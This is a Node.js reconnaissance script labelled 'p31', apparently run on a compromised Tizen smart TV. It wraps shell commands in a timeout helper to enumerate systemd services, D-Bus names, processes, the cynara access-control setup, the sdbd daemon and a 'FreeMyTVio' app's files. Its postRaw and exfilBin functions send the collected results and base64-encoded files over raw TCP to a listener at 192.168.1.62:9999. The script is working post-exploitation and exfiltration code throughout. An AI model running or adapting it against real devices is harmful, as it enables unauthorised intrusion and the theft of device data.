"use strict";
/* p31: timeout-safe rerun of p30 (Node v4 ignores execSync timeout!) + find '0' + pkg_initdb + cynara */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p31', results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }

// Node v4.4.3: execSync has NO timeout option. Wrap with toybox timeout if available, else bg+sleep+kill.
var HAS_TIMEOUT = false;
try { HAS_TIMEOUT = cp.execSync('which timeout 2>/dev/null', {maxBuffer:1024*1024}).toString().trim().length > 0; } catch(e){}
R.results.has_timeout_cmd = HAS_TIMEOUT;

var _seq = 0;
function run(cmd, timeoutMs){
  var tsec = Math.max(1, Math.ceil((timeoutMs || 30000)/1000));
  _seq++;
  var tmpout = '/tmp/.t31out_' + _seq;
  var wrapped;
  if (HAS_TIMEOUT) {
    // redirect to file: grandchildren must not hold execSync's pipe
    wrapped = 'timeout ' + tsec + ' sh -c ' + JSON.stringify(cmd) + ' >' + tmpout + ' 2>&1; RC=$?; cat ' + tmpout + ' 2>/dev/null; rm -f ' + tmpout + '; exit $RC';
  } else {
    // bg + sleep + kill pattern, pure sh
    wrapped = '( sh -c ' + JSON.stringify(cmd) + ' >' + tmpout + ' 2>&1 & CP=$!; ( sleep ' + tsec + '; kill -9 $CP 2>/dev/null ) & W=$!; wait $CP; RC=$?; kill $W 2>/dev/null; cat ' + tmpout + ' 2>/dev/null; rm -f ' + tmpout + '; exit $RC )';
  }
  try { return cp.execSync(wrapped, {maxBuffer:16*1024*1024}).toString().trim(); }
  catch(e){ var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();
    return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
function exfilBin(p, label){
  try { var b = fs.readFileSync(p); var b64 = b.toString('base64'); postRaw(label, b64); return 'posted '+b64.length+' b64'; }
  catch(e){ return 'err '+String(e).substring(0,100); }
}

// 0. sanity: timeout wrapper works
R.results.sanity = run('echo sanity-ok && ls /usr/bin/toybox >/dev/null 2>&1 && echo toybox-present', 8000);

// 1. systemd service files
R.results.acm_service = run('cat /usr/lib/systemd/system/app-context-manager.service 2>&1', 8000);
R.results.acm_service_files = run("find /usr/lib/systemd -name '*app-context*' -o -name '*tvctx*' 2>/dev/null | head -10", 20000);
R.results.acm_sizes = run('ls -la /usr/bin/app-context-db-checker /usr/bin/tvctx-manager /usr/bin/pkg_initdb /usr/bin/amd /usr/lib/libcapi-appfw-app-context-manager.so /usr/lib/libapp-context-manager-common.so 2>&1', 8000);
R.results.find_pkg_initdb = run("find / -xdev -name '*pkg_initdb*' 2>/dev/null | head -5", 60000);

// 2. DBus with HARD timeout (this hung p30)
R.results.dbus_names = run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1 | head -80', 15000);
R.results.dbus_session_names = run('dbus-send --session --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1 | head -40', 15000);
R.results.dbus_introspect = run('dbus-send --system --print-reply --dest=org.tizen.tv.appfw.appctxmgr /org/tizen/tv/appfw/appctxmgr org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -30', 15000);

// 3. FreeMyTV layout
R.results.fmtv_ls = run('ls -la /opt/usr/apps/FreeMyTVio/ 2>&1', 8000);
R.results.fmtv_find = run('find /opt/usr/apps/FreeMyTVio -maxdepth 4 -type f 2>/dev/null | head -30', 20000);
R.results.fmtv_appdata = run('ls -la /opt/usr/home/owner/apps_rw/FreeMyTVio/ 2>&1', 8000);

// 4. ps full
R.results.ps_full = run('ps -ef 2>/dev/null | head -80', 15000);
R.results.ps_ctx = run("ps -ef 2>/dev/null | grep -iE 'tvctx|context|webapp|launchpad|dbus|cynara|sdb' | grep -v grep | head -20", 15000);

// 5. /run contents (dbus socket, cynara socket, wm_ready)
R.results.run_ls = run('ls -la /run/ 2>&1 | head -40', 8000);
R.results.run_dbus = run('ls -la /run/dbus/ 2>&1; echo ---; ls -la /var/run/dbus/ 2>&1', 8000);

// 6. sdbd init script + sdb daemon process
R.results.sdbd = run('cat /etc/init.d/sdbd 2>&1', 8000);

// 7. find the '0' CLI (full search) + exfil
R.results.find_0 = run("find / -xdev -name '0' 2>/dev/null | grep -v '^/proc' | head -10", 90000);
R.results.which_0 = run("which -a 0 2>&1; echo ---; ls -la $(which 0) 2>&1", 8000);

// 8. cynara: sockets + dirs
R.results.cynara_find = run("find /run /var/run /opt -maxdepth 4 -iname '*cynara*' 2>/dev/null | head -20; echo ---; find /etc -maxdepth 3 -iname '*cynara*' 2>/dev/null | head -10", 40000);
R.results.cynara_etc = run("ls -la /opt/usr/data/cynara 2>&1; ls -la /opt/usr/home/owner 2>&1 | head -20", 8000);

// 9. pkgmgr parserlib
R.results.pkgmgr_parserlib = run('ls -la /etc/package-manager/parserlib/ 2>&1 | head -20', 8000);

// 10. launchpad info
R.results.launchpad_info = run('ls -la /usr/bin/launchpad* /usr/bin/awaiter 2>&1', 8000);

// 11. what does '0' respond with? (try common help invocations via full path guesses)
R.results.zero_help = run("for p in /usr/bin/0 /system/bin/0 /bin/0 /sbin/0 /usr/sbin/0 /opt/bin/0 /opt/usr/bin/0 /usr/local/bin/0; do [ -x \"$p\" ] && echo \"FOUND: $p\"; done 2>&1; echo ---SEARCH2---; find /usr /bin /sbin /opt -maxdepth 4 -type f -name '0' 2>/dev/null | head", 30000);

R.results.final = 'done ' + new Date().toISOString();
postRaw('/p31info', JSON.stringify(R));
L('p31 done');
